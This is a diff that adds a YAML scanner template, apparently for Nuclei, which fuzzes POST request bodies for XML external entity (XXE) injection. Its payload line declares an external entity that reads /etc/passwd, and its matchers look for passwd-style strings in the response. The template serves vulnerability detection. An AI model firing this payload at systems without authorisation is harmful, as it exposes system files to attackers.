@@ -1,0 +1,43 @@
+id: fuzz-xxe-custom
+
+info:
+  name: Custom XXE Injection Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect XXE vulnerabilities using a specified payload that attempts to read the /etc/passwd file.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'  # Adjust method as needed based on your target
+
+    payloads:
+      xxe:
+        - "<!ENTITY % data SYSTEM \"netdoc:/etc/passwd\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xxe}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"  # Look for lines indicating successful inclusion of /etc/passwd content
+          - "bin:"
+          - "daemon:"
+          - "user:"
+          - "nologin:"
+
+      - type: word
+        part: header
+        words:
+          - "application/xml"   # Expecting XML content-type, adjust as necessary
